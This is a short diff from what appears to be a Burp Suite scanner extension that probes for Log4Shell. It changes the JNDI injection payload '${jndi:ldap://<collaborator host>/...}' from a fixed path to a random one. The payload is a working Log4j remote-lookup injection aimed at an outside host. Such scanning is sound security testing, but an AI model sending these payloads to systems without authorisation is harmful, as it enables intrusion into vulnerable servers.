@@ -22,7 +22,7 @@ public class ScanLog4j extends Reporter {
         String baseValue = insertionPoint.getBaseValue();
         String collaboratorPayload = Global.interactionServer.getCollaboratorContext().generatePayload(true);
         callbacks.printOutput("generate Fastjson collaboratorPayload: " + collaboratorPayload);
-        String payload = "${jndi:ldap://" + collaboratorPayload + "/Just4Poc}";
+        String payload = "${jndi:ldap://" + collaboratorPayload + "/" + utils.getRandomString(4) + "}";
         byte[] reqEvil = insertionPoint.buildRequest((payload).getBytes());
         IHttpRequestResponse pairEvil = callbacks.makeHttpRequest(
                 baseRequestResponse.getHttpService(),
